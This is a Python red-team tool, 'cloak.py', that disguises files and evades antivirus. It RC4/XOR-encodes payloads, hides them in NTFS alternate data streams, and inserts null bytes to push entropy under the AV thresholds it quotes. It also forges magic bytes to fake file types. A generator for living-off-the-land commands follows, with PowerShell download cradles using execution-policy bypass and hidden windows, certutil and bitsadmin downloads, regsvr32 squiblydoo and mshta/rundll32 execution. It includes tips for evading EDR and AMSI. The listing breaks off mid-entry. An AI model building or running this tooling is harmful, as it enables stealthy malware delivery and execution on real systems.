#!/usr/bin/env python3
"""
cloak.py — Red Team File Utility

Modes:   info | util
For educational / research / CTF use.

Features:
  - Encoding  : Base64, Hex, XOR, Reverse, XOR→Base64, XOR→Hex, RC4
  - ADS       : Alternate Data Streams (Windows/NTFS only) — read & write
  - Entropy   : Lower file entropy by padding with structured junk
  - Rename    : Replace or append file extensions
  - Spoof     : Overwrite magic bytes to fake file type
  - Hashes    : MD5 / SHA1 / SHA256
"""


import argparse
import base64
import hashlib
import math
import os
import struct
import sys
from pathlib import Path

# ═══════════════════════════════════════════════════════════════════════════════
#  CONSTANTS
# ═══════════════════════════════════════════════════════════════════════════════

MAGIC_MAP = {
    ".pdf":    bytes([0x25, 0x50, 0x44, 0x46]),
    ".png":    bytes([0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A]),
    ".jpg":    bytes([0xFF, 0xD8, 0xFF]),
    ".jpeg":   bytes([0xFF, 0xD8, 0xFF]),
    ".gif":    bytes([0x47, 0x49, 0x46, 0x38]),
    ".zip":    bytes([0x50, 0x4B, 0x03, 0x04]),
    ".docx":   bytes([0x50, 0x4B, 0x03, 0x04]),
    ".xlsx":   bytes([0x50, 0x4B, 0x03, 0x04]),
    ".pptx":   bytes([0x50, 0x4B, 0x03, 0x04]),
    ".7z":     bytes([0x37, 0x7A, 0xBC, 0xAF, 0x27, 0x1C]),
    ".gz":     bytes([0x1F, 0x8B]),
    ".bz2":    bytes([0x42, 0x5A, 0x68]),
    ".rar":    bytes([0x52, 0x61, 0x72, 0x21, 0x1A, 0x07]),
    ".exe":    bytes([0x4D, 0x5A]),
    ".dll":    bytes([0x4D, 0x5A]),
    ".elf":    bytes([0x7F, 0x45, 0x4C, 0x46]),
    ".mp3":    bytes([0x49, 0x44, 0x33]),
    ".mp4":    bytes([0x00, 0x00, 0x00, 0x18, 0x66, 0x74, 0x79, 0x70]),
    ".wav":    bytes([0x52, 0x49, 0x46, 0x46]),
    ".bmp":    bytes([0x42, 0x4D]),
    ".ico":    bytes([0x00, 0x00, 0x01, 0x00]),
    ".xml":    bytes([0x3C, 0x3F, 0x78, 0x6D, 0x6C]),
    ".sqlite": bytes([0x53, 0x51, 0x4C, 0x69, 0x74, 0x65, 0x20, 0x66,
                      0x6F, 0x72, 0x6D, 0x61, 0x74, 0x20, 0x33]),
    ".class":  bytes([0xCA, 0xFE, 0xBA, 0xBE]),
    ".dmg":    bytes([0x78, 0x01, 0x73, 0x0D, 0x62, 0x62]),
    ".iso":    bytes([0x43, 0x44, 0x30, 0x30, 0x31]),
}

# ═══════════════════════════════════════════════════════════════════════════════
#  ANSI COLOUR HELPERS
# ═══════════════════════════════════════════════════════════════════════════════

USE_COLOR = sys.stdout.isatty()

def _c(text, code):
    return f"\033[{code}m{text}\033[0m" if USE_COLOR else text

def green(t):   return _c(t, "92")
def yellow(t):  return _c(t, "93")
def cyan(t):    return _c(t, "96")
def magenta(t): return _c(t, "95")
def grey(t):    return _c(t, "90")
def red(t):     return _c(t, "91")
def bold(t):    return _c(t, "1")

def info(msg):  print(cyan(f"[*] {msg}"))
def ok(msg):    print(green(f"[+] {msg}"))
def warn(msg):  print(yellow(f"[~] {msg}"))
def err(msg):   print(red(f"[!] {msg}"), file=sys.stderr)

# ═══════════════════════════════════════════════════════════════════════════════
#  SHARED HELPERS
# ═══════════════════════════════════════════════════════════════════════════════

def banner(quiet: bool):
    if quiet:
        return
    print()
    print(cyan("  ╔════════════════════════════════════════════════╗"))
    print(cyan("  ║                   cloak                        ║"))
    print(cyan("  ╚════════════════════════════════════════════════╝"))
    print()

def fmt_bytes(n: int) -> str:
    for unit in ("B", "KB", "MB", "GB", "TB"):
        if n < 1024:
            return f"{n:.2f} {unit}"
        n /= 1024
    return f"{n:.2f} TB"

def read_file(path: str) -> bytes:
    p = Path(path)
    if not p.exists():
        raise FileNotFoundError(f"Cannot find path '{path}'")
    return p.read_bytes()

def write_file(path: str, data: bytes):
    p = Path(path)
    p.parent.mkdir(parents=True, exist_ok=True)
    p.write_bytes(data)

def show_hashes(path: str):
    data = read_file(path)
    print()
    print(cyan(f"  Hashes for: {path}"))
    print(f"  MD5:    {hashlib.md5(data).hexdigest().upper()}")
    print(f"  SHA1:   {hashlib.sha1(data).hexdigest().upper()}")
    print(f"  SHA256: {hashlib.sha256(data).hexdigest().upper()}")

def calc_entropy(data: bytes) -> float:
    """Shannon entropy of a byte sequence (0.0 – 8.0)."""
    if not data:
        return 0.0
    counts = [0] * 256
    for b in data:
        counts[b] += 1
    n = len(data)
    entropy = 0.0
    for c in counts:
        if c:
            p = c / n
            entropy -= p * math.log2(p)
    return entropy

# ═══════════════════════════════════════════════════════════════════════════════
#  MAGIC BYTE SPOOFING
# ═══════════════════════════════════════════════════════════════════════════════

def set_magic_bytes(path: str, ext: str):
    ext = ext.lower()
    magic = MAGIC_MAP.get(ext)
    if not magic:
        warn(f"No magic bytes defined for '{ext}' — header unchanged.")
        return
    data = bytearray(read_file(path))
    if len(data) < len(magic):
        data += bytes(len(magic) - len(data))
    data[:len(magic)] = magic
    write_file(path, bytes(data))
    hex_str = " ".join(f"0x{b:02X}" for b in magic)
    ok(f"Magic bytes set for '{ext}': {hex_str}")

# ═══════════════════════════════════════════════════════════════════════════════
#  RC4
# ═══════════════════════════════════════════════════════════════════════════════

def rc4(data: bytes, key: bytes) -> bytes:
    """RC4 stream cipher — same function encrypts and decrypts."""
    S = list(range(256))
    j = 0
    for i in range(256):
        j = (j + S[i] + key[i % len(key)]) % 256
        S[i], S[j] = S[j], S[i]
    out = []
    i = j = 0
    for byte in data:
        i = (i + 1) % 256
        j = (j + S[i]) % 256
        S[i], S[j] = S[j], S[i]
        out.append(byte ^ S[(S[i] + S[j]) % 256])
    return bytes(out)

def prompt_rc4_key() -> bytes:
    raw = input("  RC4 key (string or hex e.g. 0xDEADBEEF): ").strip()
    if raw.lower().startswith("0x"):
        key_hex = raw[2:]
        if len(key_hex) % 2:
            key_hex = "0" + key_hex
        return bytes.fromhex(key_hex)
    return raw.encode()

# ═══════════════════════════════════════════════════════════════════════════════
#  ENTROPY MANIPULATION  — null byte interleaving
# ═══════════════════════════════════════════════════════════════════════════════

# Null byte insertion: insert one \x00 after every N payload bytes.
# Null bytes are extremely common in real PE binaries (section alignment,
# wide strings, padding) so this looks natural under forensic analysis.
# The inserted bytes are uniformly distributed throughout the file —
# no obvious high-entropy / low-entropy boundary like append-junk produces.
#
# NO marker is embedded in the file — nothing to find.
# The interval is the only secret. Keep it with your RC4 key.
#
# File structure:
#   interval=1: [b0]\x00[b1]\x00[b2]\x00...  (size doubles)
#   interval=2: [b0][b1]\x00[b2][b3]\x00...  (size +50%)
#   interval=4: [b0][b1][b2][b3]\x00...       (size +25%)
#
# Recovery formula (no marker needed):
#   original_size = (padded_size * interval) // (interval + 1)

def lower_entropy(data: bytes, target: float = 6.0) -> bytes:
    """
    Insert null bytes at a regular interval throughout the payload to lower
    Shannon entropy. Automatically picks the sparsest interval that still
    reaches the target (minimises size increase).

    NO marker is written to the file. To reverse, pass the interval printed
    here to --strip-padding.

    Interval meanings:
      1 → null after every byte   (size ×2,     maximum reduction)
      2 → null after every 2      (size ×1.5)
      4 → null after every 4      (size ×1.25)
     16 → null after every 16     (size ×1.06,  minimum reduction)

    Typical AV thresholds:
      > 7.2   — almost certainly packed/encrypted
      6.5–7.2 — suspicious
      < 6.5   — generally considered benign
    """
    current = calc_entropy(data)
    if current <= target:
        info(f"Entropy already {current:.3f} — no null insertion needed.")
        return data

    info(f"Current entropy : {current:.3f}")
    info(f"Target entropy  : {target:.3f}")

    chosen_interval = None
    chosen_result   = None

    # Try sparsest first to minimise file size increase
    for interval in [16, 12, 8, 6, 4, 3, 2, 1]:
        result = bytearray()
        for i, byte in enumerate(data):
            result.append(byte)
            if (i + 1) % interval == 0:
                result.append(0x00)
        achieved = calc_entropy(bytes(result))
        if achieved <= target:
            chosen_interval = interval
            chosen_result   = bytes(result)
            # keep trying sparser — we want the largest interval that works

    if chosen_result is None:
        # Even interval=1 not enough — use it anyway
        chosen_interval = 1
        result = bytearray()
        for byte in data:
            result.append(byte)
            result.append(0x00)
        chosen_result = bytes(result)
        warn(f"Could not reach target {target:.3f} even at max density — using interval=1.")

    final_entropy = calc_entropy(chosen_result)
    size_increase = len(chosen_result) - len(data)
    pct = int(100 * size_increase / len(data))
    ok(f"Entropy reduced : {current:.3f} → {final_entropy:.3f}")
    ok(f"Null interval   : 1 null per {chosen_interval} byte(s)")
    ok(f"Size increase   : {fmt_bytes(size_increase)} (+{pct}%)")
    print()
    print(yellow(f"  ⚠  Save this interval — needed to recover the original:"))
    print(yellow(f"     python cloak.py util -c <padded_file> --strip-padding {chosen_interval}"))
    print()
    return chosen_result


def strip_null_padding(data: bytes, interval: int) -> bytes:
    """
    Reverse null-byte interleaving. Interval must be provided — no marker
    is embedded in the file.

    Uses the formula: original_size = (padded_size * interval) // (interval + 1)
    to verify the result is the right length before returning.
    """
    if interval < 1:
        raise ValueError("Interval must be >= 1.")

    result    = bytearray()
    group_pos = 0
    i         = 0

    while i < len(data):
        result.append(data[i])
        group_pos += 1
        i += 1
        if group_pos == interval and i < len(data):
            # Skip the inserted null
            i += 1
            group_pos = 0

    # Sanity check via formula
    expected = (len(data) * interval) // (interval + 1)
    if abs(len(result) - expected) > interval:
        warn(f"Recovered size {len(result)} differs from expected {expected} — "
             f"interval may be wrong.")

    ok(f"Padding stripped : interval was 1 null per {interval} byte(s)")
    ok(f"Recovered size   : {fmt_bytes(len(result))} ({len(result)} bytes)")
    return bytes(result)

# ═══════════════════════════════════════════════════════════════════════════════
#  ALTERNATE DATA STREAMS  (Windows / NTFS only)
# ═══════════════════════════════════════════════════════════════════════════════

def _require_windows(op: str):
    if sys.platform != "win32":
        raise OSError(f"ADS {op} requires Windows/NTFS. "
                      f"Current platform: {sys.platform}")

def ads_write(carrier: str, stream_name: str, payload_path: str):
    """Write a file's contents into carrier:stream_name."""
    _require_windows("write")
    payload = read_file(payload_path)
    ads_path = f"{carrier}:{stream_name}"
    with open(ads_path, "wb") as f:
        f.write(payload)
    ok(f"Stream written  : {ads_path}  ({fmt_bytes(len(payload))})")
    info("Tip: visible only via  dir /r  or  Get-Item -Stream *")

def ads_read(carrier: str, stream_name: str, output: str):
    """Read carrier:stream_name and write to output file."""
    _require_windows("read")
    ads_path = f"{carrier}:{stream_name}"
    try:
        with open(ads_path, "rb") as f:
            data = f.read()
    except FileNotFoundError:
        raise FileNotFoundError(
            f"Stream '{stream_name}' not found on '{carrier}'. "
            f"Use  dir /r \"{carrier}\"  to list available streams."
        )
    write_file(output, data)
    ok(f"Stream read     : {ads_path}  ({fmt_bytes(len(data))})")
    ok(f"Written to      : {output}")

def ads_list(carrier: str):
    """List all ADS streams on a file using PowerShell."""
    _require_windows("list")
    import subprocess
    cmd = ["powershell", "-NoProfile", "-Command",
           f"Get-Item -Path '{carrier}' -Stream * | "
           f"Select-Object Stream, Length | Format-Table -AutoSize"]
    result = subprocess.run(cmd, capture_output=True, text=True)
    if result.returncode != 0:
        raise OSError(f"PowerShell error: {result.stderr.strip()}")
    print()
    print(cyan(f"  ADS streams on: {carrier}"))
    for line in result.stdout.strip().splitlines():
        print(f"  {line}")

def ads_delete(carrier: str, stream_name: str):
    """Delete a named ADS stream."""
    _require_windows("delete")
    import subprocess
    cmd = ["powershell", "-NoProfile", "-Command",
           f"Remove-Item -Path '{carrier}' -Stream '{stream_name}'"]
    result = subprocess.run(cmd, capture_output=True, text=True)
    if result.returncode != 0:
        raise OSError(f"PowerShell error: {result.stderr.strip()}")
    ok(f"Stream deleted  : {carrier}:{stream_name}")

# ═══════════════════════════════════════════════════════════════════════════════
#  ENCODING MENU
# ═══════════════════════════════════════════════════════════════════════════════

def parse_xor_key(raw: str) -> int:
    raw = raw.strip()
    if raw.lower().startswith("0x"):
        return int(raw, 16)
    return int(raw)

def xor_bytes(data: bytes, key: int) -> bytes:
    return bytes(b ^ key for b in data)

def encoding_menu(file_path: str) -> str:
    """
    Show interactive encoding menu.
    Returns path to encoded file (.enc). Caller responsible for cleanup.
    Returns original path unchanged if no encoding selected.
    """
    print()
    print(magenta("  ┌───────────────────────────────┐"))
    print(magenta("  │     Encoding Techniques       │"))
    print(magenta("  ├───────────────────────────────┤"))
    print(magenta("  │  [1] Base64                   │"))
    print(magenta("  │  [2] Hex                      │"))
    print(magenta("  │  [3] XOR  (key prompted)      │"))
    print(magenta("  │  [4] Reverse bytes            │"))
    print(magenta("  │  [5] XOR → Base64             │"))
    print(magenta("  │  [6] XOR → Hex                │"))
    print(magenta("  │  [7] RC4  (key prompted)      │"))
    print(magenta("  └───────────────────────────────┘"))

    choice    = input("  Select technique [1-7]: ").strip()
    data      = read_file(file_path)
    is_binary = False
    encoded   = None

    if choice == "1":
        encoded = base64.b64encode(data).decode()
        ok("Base64 encoding applied.")

    elif choice == "2":
        encoded = data.hex().upper()
        ok("Hex encoding applied.")

    elif choice == "3":
        raw = input("  XOR key (hex e.g. 0x41 or decimal e.g. 65): ").strip()
        key = parse_xor_key(raw)
        encoded   = xor_bytes(data, key)
        is_binary = True
        ok(f"XOR applied (key 0x{key:02X}).")

    elif choice == "4":
        encoded   = bytes(reversed(data))
        is_binary = True
        ok("Byte order reversed.")

    elif choice == "5":
        raw = input("  XOR key (hex e.g. 0x41 or decimal e.g. 65): ").strip()
        key = parse_xor_key(raw)
        encoded = base64.b64encode(xor_bytes(data, key)).decode()
        ok(f"XOR (0x{key:02X}) → Base64 applied.")

    elif choice == "6":
        raw = input("  XOR key (hex e.g. 0x41 or decimal e.g. 65): ").strip()
        key = parse_xor_key(raw)
        encoded = xor_bytes(data, key).hex().upper()
        ok(f"XOR (0x{key:02X}) → Hex applied.")

    elif choice == "7":
        key = prompt_rc4_key()
        encoded   = rc4(data, key)
        is_binary = True
        ok(f"RC4 applied (key length {len(key)} bytes).")

    else:
        print("  Invalid selection — no encoding applied.")
        return file_path

    out_path = file_path + ".enc"
    if is_binary:
        write_file(out_path, encoded)
    else:
        write_file(out_path, encoded.encode())

    ok(f"Encoded file saved → {out_path}")
    return out_path

# ═══════════════════════════════════════════════════════════════════════════════
#  DECODING MENU
# ═══════════════════════════════════════════════════════════════════════════════
def decoding_menu(file_path: str) -> str:
    """
    Show interactive decoding menu.
    Returns path to decoded file (.dec). Caller responsible for cleanup.
    Returns original path unchanged if no decoding selected.
    """
    print()
    print(magenta("  ┌───────────────────────────────┐"))
    print(magenta("  │     Decoding Techniques       │"))
    print(magenta("  ├───────────────────────────────┤"))
    print(magenta("  │  [1] Base64                   │"))
    print(magenta("  │  [2] Hex                      │"))
    print(magenta("  │  [3] XOR  (key prompted)      │"))
    print(magenta("  │  [4] Reverse bytes            │"))
    print(magenta("  │  [5] XOR ← Base64             │"))
    print(magenta("  │  [6] XOR ← Hex                │"))
    print(magenta("  │  [7] RC4  (key prompted)      │"))
    print(magenta("  └───────────────────────────────┘"))

    choice    = input("  Select technique [1-7]: ").strip()
    data      = read_file(file_path)
    is_binary = True
    decoded   = None

    if choice == "1":
        # Base64 decode
        decoded = base64.b64decode(data)
        ok("Base64 decoding applied.")

    elif choice == "2":
        # Hex decode
        decoded = bytes.fromhex(data.decode().strip())
        ok("Hex decoding applied.")

    elif choice == "3":
        # XOR decode
        raw = input("  XOR key (hex e.g. 0x41 or decimal e.g. 65): ").strip()
        key = parse_xor_key(raw)
        decoded = xor_bytes(data, key)
        ok(f"XOR decoding applied (key 0x{key:02X}).")

    elif choice == "4":
        # Reverse bytes
        decoded = bytes(reversed(data))
        ok("Byte order reversed (decode).")

    elif choice == "5":
        # XOR ← Base64
        raw = input("  XOR key (hex e.g. 0x41 or decimal e.g. 65): ").strip()
        key = parse_xor_key(raw)
        decoded = xor_bytes(base64.b64decode(data), key)
        ok(f"Base64 → XOR decoding applied (key 0x{key:02X}).")

    elif choice == "6":
        # XOR ← Hex
        raw = input("  XOR key (hex e.g. 0x41 or decimal e.g. 65): ").strip()
        key = parse_xor_key(raw)
        decoded = xor_bytes(bytes.fromhex(data.decode().strip()), key)
        ok(f"Hex → XOR decoding applied (key 0x{key:02X}).")

    elif choice == "7":
        # RC4 decode
        key = prompt_rc4_key()
        decoded = rc4(data, key)
        ok(f"RC4 decoding applied (key length {len(key)} bytes).")

    else:
        print("  Invalid selection — no decoding applied.")
        return file_path

    out_path = file_path + ".dec"
    write_file(out_path, decoded)
    ok(f"Decoded file saved → {out_path}")
    return out_path

# ═══════════════════════════════════════════════════════════════════════════════
#  INFO
# ═══════════════════════════════════════════════════════════════════════════════

def do_info(args):
    data = read_file(args.carrier)

    print(cyan(f"[*] File           : {args.carrier}"))
    print(cyan(f"[*] Size           : {fmt_bytes(len(data))} ({len(data)} bytes)"))

    # Entropy
    entropy = calc_entropy(data)
    entropy_label = (
        green("low — looks benign")        if entropy < 6.5  else
        yellow("medium — mildly suspicious") if entropy < 7.2  else
        red("high — likely packed/encrypted")
    )
    print(cyan(f"[*] Entropy        : {entropy:.3f} / 8.0  ") + f"({entropy_label})")

    # First 16 bytes
    preview     = data[:16]
    hex_preview = " ".join(f"{b:02X}" for b in preview)
    print(cyan(f"[*] First 16 bytes : {hex_preview}"))

    # Magic byte match
    matched_types = []
    for ext, magic in MAGIC_MAP.items():
        if data[:len(magic)] == magic:
            matched_types.append(ext)
    if matched_types:
        ok(f"Header matches known format(s): {', '.join(matched_types)}")
    else:
        warn("Header does not match any known magic bytes in the map.")

    if args.show_hashes:
        show_hashes(args.carrier)

# ═══════════════════════════════════════════════════════════════════════════════
#  POST-PROCESS  (extension rename → header spoof → hashes → temp cleanup)
# ═══════════════════════════════════════════════════════════════════════════════

def strip_all_extensions(name: str) -> str:
    p = Path(name)
    while p.suffix:
        p = p.with_suffix("")
    return p.name

def post_process(work_file: str, args, protected: list) -> str:
    import shutil
    temps: list = []

    # 1. NewExtension
    if args.new_extension:
        ext      = args.new_extension if args.new_extension.startswith(".") else f".{args.new_extension}"
        base     = strip_all_extensions(Path(work_file).name)
        dir_part = str(Path(work_file).parent)
        new_name = str(Path(dir_part) / f"{base}{ext}")

        resolved_work = str(Path(work_file).resolve())
        resolved_new  = str(Path(new_name).resolve())

        if resolved_work != resolved_new:
            shutil.copy2(work_file, new_name)
            ok(f"Extension replaced → {new_name}")
            if resolved_work in [str(Path(t).resolve()) for t in temps]:
                temps.append(work_file)
        else:
            warn("Output already has target extension, skipping rename.")
            new_name = work_file

        if args.spoof_header:
            set_magic_bytes(new_name, ext)
        work_file = new_name

    # 2. AddExtension
    if args.add_extension:
        ext      = args.add_extension if args.add_extension.startswith(".") else f".{args.add_extension}"
        new_name = work_file + ext

        resolved_work = str(Path(work_file).resolve())
        resolved_new  = str(Path(new_name).resolve())

        if resolved_work != resolved_new:
            shutil.copy2(work_file, new_name)
            ok(f"Extension appended → {new_name}")
        else:
            warn("File already has that appended extension, skipping.")

        if args.spoof_header:
            set_magic_bytes(new_name, ext)
        work_file = new_name

    # 3. Hashes
    if args.show_hashes:
        show_hashes(work_file)

    # 4. Clean up temps
    final_resolved     = str(Path(work_file).resolve())
    protected_resolved = [str(Path(p).resolve()) for p in protected]

    for tmp in temps:
        tmp_resolved = str(Path(tmp).resolve())
        if (tmp_resolved != final_resolved
                and tmp_resolved not in protected_resolved
                and Path(tmp).exists()):
            Path(tmp).unlink()
            warn(f"Cleaned up temp file: {tmp}")

    return work_file

# ═══════════════════════════════════════════════════════════════════════════════
#  UTIL MODE
# ═══════════════════════════════════════════════════════════════════════════════

def do_util(args):
    target = args.carrier
    if not target:
        raise ValueError("Provide --carrier for util mode.")
    if not Path(target).exists():
        raise FileNotFoundError(f"File not found: {target}")

    # ── ADS operations (mutually exclusive with normal util flow) ──────────────
    if args.ads_write:
        if not args.ads_stream:
            raise ValueError("--ads-stream NAME is required with --ads-write.")
        ads_write(target, args.ads_stream, args.ads_write)
        return target

    if args.ads_read:
        if not args.ads_stream:
            raise ValueError("--ads-stream NAME is required with --ads-read.")
        if not args.output:
            raise ValueError("--output is required with --ads-read.")
        ads_read(target, args.ads_stream, args.output)
        return args.output

    if args.ads_list:
        ads_list(target)
        return target

    if args.ads_delete:
        if not args.ads_stream:
            raise ValueError("--ads-stream NAME is required with --ads-delete.")
        ads_delete(target, args.ads_stream)
        return target

    # ── Normal util flow ───────────────────────────────────────────────────────
    info(f"File: {target}")
    work_file = target
    temps     = []

    # Entropy — strip padding (reverse)
    if args.strip_padding is not None:
        data      = read_file(work_file)
        recovered = strip_null_padding(data, interval=args.strip_padding)
        out_path  = work_file + ".stripped"
        write_file(out_path, recovered)
        ok(f"Recovered file saved → {out_path}")
        work_file = out_path
        temps.append(out_path)

    # Entropy reduction (forward)
    elif args.lower_entropy is not None:
        data    = read_file(work_file)
        padded  = lower_entropy(data, target=args.lower_entropy)
        out_path = work_file + ".padded"
        write_file(out_path, padded)
        ok(f"Padded file saved → {out_path}")
        work_file = out_path
        temps.append(out_path)


    # Encoding/Decoding (mutually exclusive)
    if getattr(args, "decode", False) and args.decode:
        prev      = work_file
        work_file = decoding_menu(work_file)
        if work_file != prev:
            temps.append(work_file)
    elif args.encode:
        prev      = work_file
        work_file = encoding_menu(work_file)
        if work_file != prev:
            temps.append(work_file)

    # Post-process (rename / spoof / hashes)
    class _Args:
        pass
    pp_args = _Args()
    pp_args.new_extension = args.new_extension
    pp_args.add_extension = args.add_extension
    pp_args.spoof_header  = args.spoof_header
    pp_args.show_hashes   = args.show_hashes
    pp_args.strip_padding = False

    final = post_process_with_temps(work_file, pp_args, protected=[target], temps=temps)

    # If --output is specified and the final file is not already at that path, move/rename it
    if getattr(args, "output", None):
        out_path = args.output
        final_path = Path(final)
        out_path_path = Path(out_path)
        if str(final_path.resolve()) != str(out_path_path.resolve()):
            import shutil
            shutil.move(str(final_path), str(out_path_path))
            ok(f"Final output moved/renamed → {out_path}")
            final = str(out_path_path)
    return final

def post_process_with_temps(work_file: str, args, protected: list, temps: list) -> str:
    import shutil

    if args.new_extension:
        ext      = args.new_extension if args.new_extension.startswith(".") else f".{args.new_extension}"
        base     = strip_all_extensions(Path(work_file).name)
        dir_part = str(Path(work_file).parent)
        new_name = str(Path(dir_part) / f"{base}{ext}")

        resolved_work = str(Path(work_file).resolve())
        resolved_new  = str(Path(new_name).resolve())

        if resolved_work != resolved_new:
            shutil.copy2(work_file, new_name)
            ok(f"Extension replaced → {new_name}")
        else:
            warn("Output already has target extension, skipping rename.")
            new_name = work_file

        if args.spoof_header:
            set_magic_bytes(new_name, ext)
        work_file = new_name

    if args.add_extension:
        ext      = args.add_extension if args.add_extension.startswith(".") else f".{args.add_extension}"
        new_name = work_file + ext
        resolved_work = str(Path(work_file).resolve())
        resolved_new  = str(Path(new_name).resolve())
        if resolved_work != resolved_new:
            shutil.copy2(work_file, new_name)
            ok(f"Extension appended → {new_name}")
        else:
            warn("File already has that appended extension, skipping.")
        if args.spoof_header:
            set_magic_bytes(new_name, ext)
        work_file = new_name

    if args.show_hashes:
        show_hashes(work_file)

    final_resolved     = str(Path(work_file).resolve())
    protected_resolved = [str(Path(p).resolve()) for p in protected]

    for tmp in temps:
        tmp_resolved = str(Path(tmp).resolve())
        if (tmp_resolved != final_resolved
                and tmp_resolved not in protected_resolved
                and Path(tmp).exists()):
            Path(tmp).unlink()
            warn(f"Cleaned up temp file: {tmp}")

    return work_file


# ═══════════════════════════════════════════════════════════════════════════════
#  LOLBIN GENERATOR
# ═══════════════════════════════════════════════════════════════════════════════

# Each entry: (lolbin_name, requires_url, requires_file, note)
# Grouped by what they can do: execute, download, download+execute

def _ps_cradles(f: str, u: str, a: str) -> list:
    """PowerShell download cradle variants — pre-computes b64 outside f-string."""
    host_url  = u or "http://host/payload.ps1"
    dl_url    = u or "http://host/payload"
    enc_cmd   = _b64ps(f"IEX(irm '{host_url}')")
    return [
        f'powershell -ep bypass -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString(\'{host_url}\')"',
        f'powershell -ep bypass -nop -enc {enc_cmd}',
        f'powershell -ep bypass -c "(New-Object Net.WebClient).DownloadFile(\'{dl_url}\',\'{f}\')"',
        f'powershell -ep bypass -c "& {{$d=(New-Object Net.WebClient).DownloadData(\'{dl_url}\');[IO.File]::WriteAllBytes(\'{f}\',$d)}}"',
    ]

def _ps_local_ps1(f: str) -> list:
    hidden = 'powershell -ep bypass -nop -w hidden -f "' + f + '"'
    run    = "powershell -ep bypass -nop -c \"& '" + f + "'\"" 
    return [hidden, run]

def _ps_local_exe(f: str) -> list:
    sp  = "powershell -ep bypass -c \"Start-Process '" + f + "'\"" 
    dp  = "powershell -ep bypass -c \"[Diagnostics.Process]::Start('" + f + "')\"" 
    return [sp, dp]


LOLBINS = {
    # ── Execute local file ────────────────────────────────────────────────────
    "rundll32": {
        "desc": "Execute DLL export or scriptlet via COM",
        "os":   "All Windows versions",
        "note": "Monitored heavily — combine with obfuscation",
        "types": [".dll", ".sct", ".hta"],
        "cmds": {
            ".dll":  lambda f,u,a: [
                f'rundll32.exe {f},{a or "EntryPoint"}',
                f'rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication ";document.write();GetObject("script:{f}")',
            ],
            ".sct":  lambda f,u,a: [
                f'rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication ";GetObject("script:{f}")',
            ],
            ".hta":  lambda f,u,a: [
                f'rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("{f}")',
            ],
        },
    },
    "regsvr32": {
        "desc": "Register/execute DLL or remote scriptlet (squiblydoo)",
        "os":   "All Windows versions",
        "note": "Classic AppLocker bypass — ASR rules may block on Defender ATP",
        "types": [".dll", ".sct"],
        "cmds": {
            ".dll": lambda f,u,a: [
                f'regsvr32.exe /s {f}',
                f'regsvr32.exe /s /u {f}',
            ],
            ".sct": lambda f,u,a: [
                f'regsvr32.exe /s /n /u /i:{f} scrobj.dll',
                f'regsvr32.exe /s /n /u /i:{u or f} scrobj.dll',
            ],
        },
    },
    "mshta": {
        "desc": "Execute HTA application — bypasses AppLocker",
        "os":   "All Windows versions",
        "note": "Often blocked by ASR rule: Block all Office applications from creating child processes",
        "types": [".hta", ".sct", ".vbs"],
        "cmds": {
            ".hta": lambda f,u,a: [
                f'mshta.exe {f}',
                f'mshta.exe "{u or f}"',
                f'mshta vbscript:Execute("CreateObject(""Wscript.Shell"").Run ""{f}"":close")',
            ],
            ".sct": lambda f,u,a: [
                f'mshta.exe "{u or f}"',
            ],
            ".vbs": lambda f,u,a: [
                f'mshta vbscript:Execute("CreateObject(""Wscript.Shell"").Run ""{f}"":close")',
            ],
        },
    },
    "wmic": {
        "desc": "Execute XSL transform or process creation",
        "os":   "⚠ Removed in Win 11 22H2+ and Server 2025. Works on Win 10, Server 2016/2019/2022",
        "note": "Use full path: C:\\Windows\\System32\\wbem\\wmic.exe on older builds",
        "types": [".xsl", ".exe", ".sct"],
        "cmds": {
            ".xsl": lambda f,u,a: [
                f'wmic process get brief /format:"{f}"',
                f'wmic process get brief /format:"{u or f}"',
                f'wmic os get /format:"{f}"',
            ],
            ".exe": lambda f,u,a: [
                f'wmic process call create "{f}"',
                f'wmic /node:127.0.0.1 process call create "{f}"',
            ],
            ".sct": lambda f,u,a: [
                f'wmic process get brief /format:"{u or f}"',
            ],
        },
    },
    "certutil": {
        "desc": "Download file, decode Base64/hex, or execute",
        "os":   "All Windows versions",
        "note": "Network traffic to non-cert URLs is flagged by many EDRs — use with caution",
        "types": [".exe", ".dll", ".b64", ".hex", "*"],
        "cmds": {
            "*": lambda f,u,a: [
                f'certutil.exe -urlcache -split -f "{u or "http://host/payload"}" {f}',
                f'certutil.exe -decode {f} output.exe',
                f'certutil.exe -decodehex {f} output.exe',
                f'certutil.exe -verifyctl -f -split "{u or "http://host/payload"}"',
            ],
        },
    },
    "bitsadmin": {
        "desc": "Background download via BITS service",
        "os":   "All Windows versions (deprecated but present)",
        "note": "Deprecated since Win 7 — use PowerShell BITS cmdlets on modern systems",
        "types": ["*"],
        "cmds": {
            "*": lambda f,u,a: [
                f'bitsadmin /transfer job /download /priority high "{u or "http://host/payload"}" "%TEMP%\\{Path(f).name}"',
                f'bitsadmin /transfer job "{u or "http://host/payload"}" %TEMP%\\{Path(f).name} & bitsadmin /complete job',
            ],
        },
    },
    "powershell": {
        "desc": "Download cradles and execution one-liners",
        "os":   "All Windows versions",
        "note": "ScriptBlock logging and AMSI active on Win 10+. Use -enc and obfuscation",
        "types": ["*", ".ps1", ".exe", ".dll"],
        "cmds": {
            "*": lambda f,u,a: _ps_cradles(f, u, a),
            ".ps1": lambda f,u,a: _ps_local_ps1(f),
            ".exe": lambda f,u,a: _ps_local_exe(f),
        },
    },
    "msiexec": {
        "desc": "Install/execute MSI package locally or from URL",
        "os":   "All Windows versions",
        "note": "Remote URL installs may require SMB/HTTP — UAC prompt possible without /quiet",
        "types": [".msi"],
        "cmds": {
            ".msi": lambda f,u,a: [
                f'msiexec /quiet /i {f}',
                f'msiexec /quiet /i "{u or "http://host/payload.msi"}"',
                f'msiexec /q /i {f} TRANSFORMS=evil.mst',
            ],
        },
    },
    "odbcconf": {
        "desc": "Execute DLL via ODBC config action",
        "os":   "All Windows versions",
        "note": "Low detection rate — rarely monitored. DLL must export DllRegisterServer",
        "types": [".dll", ".rsp"],
        "cmds": {
            ".dll": lambda f,u,a: [
                f'odbcconf.exe /a {{REGSVR {f}}}',
                f'odbcconf.exe /s /a {{REGSVR {f}}}',
            ],
            ".rsp": lambda f,u,a: [
                f'odbcconf.exe /f {f}',
            ],
        },
    },
    "ieexec": {
        "desc": "Download and execute via Internet Explorer engine",
